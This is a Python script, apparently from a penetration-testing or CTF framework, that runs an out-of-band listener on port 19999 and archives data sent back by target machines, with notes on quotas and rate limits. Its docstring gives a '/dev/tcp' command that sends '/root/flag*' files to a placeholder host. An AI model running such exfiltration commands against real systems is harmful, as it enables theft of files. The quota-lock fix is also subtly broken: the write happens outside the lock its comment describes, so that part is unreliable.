#!/usr/bin/env python3
"""OOB 侧信道收集器:监听 19999,收到的数据按时间+来源落盘。
靶机侧用法: cat /root/flag* > /dev/tcp/<runtime-host>/19999
产物: /var/lib/spectre/oob/<ts>-<ip>.txt(只读归档,审计可查)

F12 加固(2026-09-27 QA 循环6,公网 IP 已实际触达):
- 目录总量配额 512MB(超限丢弃+告警)——97% 磁盘下 ~8 万连接即填满 /
- 每 IP 频率限制 10 连接/分钟(滑动窗口)——防刷
- 单连接 64KB 不变;0.0.0.0 绑定不变(靶机回连必需)
"""
import socket, threading, time, os, datetime
from collections import defaultdict, deque

import os
OUT = os.path.join(os.environ.get('SPECTRE_DATA_DIR', '/var/lib/spectre'), 'oob')
QUOTA_BYTES = 512 * 1024 * 1024      # 目录总量上限
RATE_PER_IP = 10                     # 每 IP 每分钟连接数
RATE_WINDOW = 60.0

os.makedirs(OUT, exist_ok=True)

def dir_bytes():
    total = 0
    for fn in os.listdir(OUT):
        try:
            total += os.path.getsize(os.path.join(OUT, fn))
        except OSError:
            pass
    return total

_rate = defaultdict(deque)           # ip -> deque[timestamps]
_rate_lock = threading.Lock()
_quota_lock = threading.Lock()      # R17-F4: 配额 check-写原子化

def rate_ok(ip):
    now = time.monotonic()
    with _rate_lock:
        q = _rate[ip]
        while q and now - q[0] > RATE_WINDOW:
            q.popleft()
        if len(q) >= RATE_PER_IP:
            return False
        q.append(now)
        if len(_rate) > 4096:        # 防内存膨胀:过期表瘦身
            for k in list(_rate.keys()):
                if not _rate[k] or now - _rate[k][-1] > RATE_WINDOW * 5:
                    _rate.pop(k, None)
        return True

def handle(c, addr):
    try:
        data = b''
        c.settimeout(10)
        # R17-F3: 总死线——单次 recv 超时挡不住 1B/9s 慢连接永久占用
        # 线程(永不满足 64KB/EOF 退出条件), FD/内存耗尽殃及合法回连。
        deadline = time.monotonic() + 60
        while len(data) < 65536 and time.monotonic() < deadline:
            chunk = c.recv(4096)
            if not chunk: break
            data += chunk
    except Exception:
        pass
    finally:
        c.close()
    if not data:
        return
    # R17-F4: check-写 TOCTOU——并发线程同读快照集体绕过。锁包住
    # 检查到落盘(仿 _rate_lock; 单写者串行化)。
    with _quota_lock:
        if dir_bytes() + len(data) > QUOTA_BYTES:
            print(f'[oob][QUOTA] 目录超限 {QUOTA_BYTES//(1024*1024)}MB,丢弃 {addr[0]} 的 {len(data)}B', flush=True)
            return
    ts = datetime.datetime.now().strftime('%Y%m%d-%H%M%S-%f')
    path = f'{OUT}/{ts}-{addr[0]}.txt'
    with open(path, 'ab') as f:
        f.write(data)
    print(f'[oob] {addr[0]} → {path} ({len(data)}B)', flush=True)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', int(os.environ.get('OOB_PORT', '19999')))); s.listen(16)
print(f'[oob] listening :{os.environ.get("OOB_PORT", "19999")} (quota={QUOTA_BYTES//(1024*1024)}MB, rate={RATE_PER_IP}/min/ip)', flush=True)
while True:
    c, addr = s.accept()
    if not rate_ok(addr[0]):
        c.close()
        print(f'[oob][RATE] {addr[0]} 超频,拒绝', flush=True)
        continue
    threading.Thread(target=handle, args=(c, addr), daemon=True).start()
